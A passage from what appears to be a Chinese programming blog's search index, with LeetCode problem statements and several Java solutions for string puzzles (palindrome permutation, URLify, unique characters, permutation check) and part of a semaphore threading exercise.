打印完0后继续执行odd方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">even</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            evenSemaphore.acquire();</span><br><span class="line">            <span class="keyword">if</span> (i &gt; n) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            printNumber.accept(i);</span><br><span class="line">            oddSemaphore.release();<span class="comment">// 打印完偶数后继续执行odd方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">odd</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= n) &#123;</span><br><span class="line">            oddSemaphore.acquire();          </span><br><span class="line">            zeroSemaphore.release();<span class="comment">// 打印0</span></span><br><span class="line">            oddSemaphore.acquire();<span class="comment">// 阻塞当前线程，等待0打印完成</span></span><br><span class="line">            <span class="keyword">if</span> ((i &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                printNumber.accept(i);<span class="comment">// 打印奇数</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                evenSemaphore.release();<span class="comment">// 打印偶数</span></span><br><span class="line">                oddSemaphore.acquire();<span class="comment">// 阻塞当前线程，等待偶数打印完成</span></span><br><span class="line">            &#125;</span><br><span class="line">            i++;    </span><br><span class="line">            oddSemaphore.release();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 释放最后遗留的锁</span></span><br><span class="line">        zeroSemaphore.release();</span><br><span class="line">        evenSemaphore.release();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>多线程</tag>
        <tag>Condition</tag>
        <tag>ReentrantLock</tag>
        <tag>Semaphore</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.04 回文排列</title>
    <url>/2020/04/05/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-01.04-%E5%9B%9E%E6%96%87%E6%8E%92%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，编写一个函数判定其是否为某个回文串的排列之一。</p>
<p>回文串是指正反两个方向都一样的单词或短语。排列是指字母的重新排列。</p>
<p>回文串不一定是字典当中的单词。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;tactcoa&quot;</span><br><span class="line">输出：true（排列有&quot;tacocat&quot;、&quot;atcocta&quot;，等等）</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>计数字符法。</p>
<p>统计所有的字符出现的次数，如果每个字符出现的次数都是偶数，或者出现奇数个数的字符只有一个，那么就是一个回文字符串。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canPermutePalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">				map.replace(c, map.get(c) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				map.put(c, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">boolean</span> allEven = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">int</span> countOdd = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> value : map.values()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (value % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">				allEven = <span class="keyword">false</span>;</span><br><span class="line">				countOdd++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> (<span class="number">1</span> == countOdd || allEven);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用位运算。参考<a href="题解">https://leetcode-cn.com/problems/palindrome-permutation-lcci/solution/shuang-bai-wei-tu-fang-fa-by-1ujin/</a></p>
<p>判断出现奇数次的字符最多只有一个（该字符将会出现在中点位置）。全体字符有128个，可以用高低两个 long 类型的位图表示128位。通过将 1L 左移，例如 ‘A’ 的 ASCII 值为65，就向左移动65位，所以位图的从第0位向左数第65位表示 ‘A’，以此类推。0 ~ 63 放在低位，64 ~ 127 放在高位。如果是0与1异或是1：0 ^ 1 = 1，1再与1异或又变回0：1 ^ 1 = 0，所以0代表该位上得字符出现偶数次。最后利用Long.bitCount()统计一下1的数量，是否小于等于1，即是否最多只有1个字符出现奇数次。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canPermutePalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> highBmp = <span class="number">0</span>, lowBmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) &gt;= <span class="number">64</span>) &#123;</span><br><span class="line">                highBmp ^= <span class="number">1L</span> &lt;&lt; s.charAt(i) - <span class="number">64</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                lowBmp ^= <span class="number">1L</span> &lt;&lt; s.charAt(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Long.bitCount(highBmp) + Long.bitCount(lowBmp) &lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.03 URL化</title>
    <url>/2020/04/05/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-01.03-URL%E5%8C%96/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>URL化。编写一种方法，将字符串中的空格全部替换为%20。假定该字符串尾部有足够的空间存放新增字符，并且知道字符串的“真实”长度。（注：用Java实现的话，请使用字符数组实现，以便直接在数组上操作。）</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;Mr John Smith    &quot;, 13</span><br><span class="line">输出：&quot;Mr%20John%20Smith&quot;</span><br></pre></td></tr></table></figure>

<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="string">"               "</span>, <span class="number">5</span></span><br><span class="line">输出：<span class="string">"%20%20%20%20%20"</span></span><br></pre></td></tr></table></figure>

<h3 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h3><ul>
<li>字符串长度在[0, 500000]范围内。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用库函数</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replaceSpaces</span><span class="params">(String S, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> S.substring(<span class="number">0</span>, length).replace(<span class="string">" "</span>, <span class="string">"%20"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用StringBuilder</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replaceSpaces</span><span class="params">(String S, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">' '</span> == S.charAt(i)) &#123;</span><br><span class="line">                sb.append(<span class="string">"%20"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(S.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.01 判断字符是否唯一</title>
    <url>/2020/04/04/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-01.01-%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E5%94%AF%E4%B8%80/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一个算法，确定一个字符串 <code>s</code> 的所有字符是否全都不同。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>

<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="string">"abc"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h3 id="限制"><a href="#限制" class="headerlink" title="限制:"></a>限制:</h3><ul>
<li><code>0 &lt;= len(s) &lt;= 100</code></li>
<li>如果你不使用额外的数据结构，会很加分。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashSet。将字符串分割为每个字符的字符HashSet，比较HashSet是否合原字符串长度一致即可。</p>
<p>这里需要注意的是，如果字符串为空，应该返回true</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == astr || <span class="number">0</span> == astr.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] strs = astr.split(<span class="string">""</span>);</span><br><span class="line">        List&lt;String&gt; list = Arrays.asList(strs);</span><br><span class="line">        Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;(list);</span><br><span class="line">        <span class="keyword">return</span> set.size() == astr.length();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>将字符串转换为char数组，排序，遍历判断即可</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = astr.toCharArray();</span><br><span class="line">        Arrays.sort(chars);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; chars.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] == chars[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>暴力破解</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; astr.length();i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; astr.length();j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (astr.charAt(i) == astr.charAt(j)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h4><p>使用字符串的replace方法。遍历字符串astr的每个字符，将其替换为“”，空字符串。然后比较新的字符串和astr的长度差，如果两者差超过1，表示存在一个字符出现次数是超过一次的</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; astr.length();i++) &#123;</span><br><span class="line">            String str = astr;</span><br><span class="line">            str = str.replace(String.valueOf(astr.charAt(i)), <span class="string">""</span>);</span><br><span class="line">            <span class="keyword">if</span> (str.length() != astr.length() - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五："><a href="#解法五：" class="headerlink" title="解法五："></a>解法五：</h3><p>使用bitSet</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String astr)</span> </span>&#123;</span><br><span class="line">  BitSet bitSet = <span class="keyword">new</span> BitSet();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;astr.length();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(bitSet.get(astr.charAt(i))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            bitSet.set(astr.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法六："><a href="#解法六：" class="headerlink" title="解法六："></a>解法六：</h3><p>大胆猜测，题目中的字符范围是小写字母a-z。就可以用一个int变量的其中26位保存莫哥字符是否出现过。</p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String astr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mark = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c : astr.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">int</span> move_bit = c - <span class="string">'a'</span>;</span><br><span class="line">            <span class="keyword">if</span> ((mark &amp; (<span class="number">1</span> &lt;&lt; move_bit)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mark |= (<span class="number">1</span> &lt;&lt; move_bit);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题 01.02 判断是否互为字符重排</title>
    <url>/2020/04/04/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-01.02-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BA%92%E4%B8%BA%E5%AD%97%E7%AC%A6%E9%87%8D%E6%8E%92/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串 <code>s1</code> 和 <code>s2</code>，请编写一个程序，确定其中一个字符串的字符重新排列后，能否变成另一个字符串。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: s1 &#x3D; &quot;abc&quot;, s2 &#x3D; &quot;bca&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>

<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: s1 = <span class="string">"abc"</span>, s2 = <span class="string">"bad"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h3 id="限制"><a href="#限制" class="headerlink" title="限制:"></a>限制:</h3><ul>
<li><code>0 &lt;= len(s1) &lt;= 100</code></li>
<li><code>0 &lt;= len(s2) &lt;= 100</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap。</p>
<p>首先两者长度必须相等。</p>
<p>遍历s1，每个字符存入HashMap。遍历s2，判断是否每个字符都在s1里面出现,并且出现的次数相同。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">CheckPermutation</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1.length() != s2.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : s1.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">                map.replace(c, map.get(c) + <span class="number">1</span>); </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(c, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : s2.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">                <span class="keyword">int</span> count = map.get(c);</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">1</span> == count) &#123;</span><br><span class="line">                    map.remove(c);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    map.replace(c, map.get(c) - <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>将s1和s2转为字符数组c1和c2，对其两个字符数组排序，遍历，挨个比较，不一致返回false</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">CheckPermutation</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1.length() != s2.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] c1 = s1.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] c2 = s2.toCharArray();</span><br><span class="line">        Arrays.sort(c1);</span><br><span class="line">        Arrays.sort(c2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; c1.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c1[i] != c2[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>异或运算.</p>
<p>如果两个字符数组刚好是对方的字符重排，那么它们的异或结果一定为0.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">CheckPermutation</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1.length() != s2.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] c1 = s1.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] c2 = s2.toCharArray();</span><br><span class="line">        Arrays.sort(c1);</span><br><span class="line">        Arrays.sort(c2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; c1.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c1[i] != c2[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h4><p>计数排序。</p>
<p>计算每个字符出现的次数，如果s2中出现的次数不一致，则返回false</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">CheckPermutation</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1.length() != s2.length())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s1.length();i++)&#123;</span><br><span class="line">            temp[s1.charAt(i)]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s2.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(temp[s2.charAt(i)] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            temp[s2.charAt(i)]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>170. 两数之和 III - 数据结构设计</title>
    <url>/2020/04/03/LeetCode/leetcode-000170-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20III%20-%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>设计并实现一个 TwoSum 的类，使该类需要支持 <code>add</code> 和 <code>find</code> 的操作。</p>
<p><code>add</code> 操作 - 对内部数据结构增加一个数。<br> <code>find</code> 操作 - 寻找内部数据结构中是否存在一对整数，使得两数之和与给定的数相等。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>); add(<span class="number">3</span>); add(<span class="number">5</span>);</span><br><span class="line">find(<span class="number">4</span>) -&gt; <span class="keyword">true</span></span><br><span class="line">find(<span class="number">7</span>) -&gt; <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(<span class="number">3</span>); add(<span class="number">1</span>); add(<span class="number">2</span>);</span><br><span class="line">find(<span class="number">3</span>) -&gt; <span class="keyword">true</span></span><br><span class="line">find(<span class="number">6</span>) -&gt; <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用HashMap保存元素出现的次数。</p>
<p>如果target刚好是其中某个值的两倍，那么该值的出现次数一定要大于等于2</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwoSum</span> &#123;</span></span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;Integer, Integer&gt; numCounts;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TwoSum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.numCounts = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Add the number to an internal data structure.. */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.numCounts.containsKey(number)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.numCounts.replace(number, <span class="keyword">this</span>.numCounts.get(number) + <span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> 